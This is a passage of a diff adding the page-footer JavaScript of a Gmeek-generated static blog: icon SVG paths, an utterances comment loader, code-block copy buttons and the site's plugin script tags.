+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
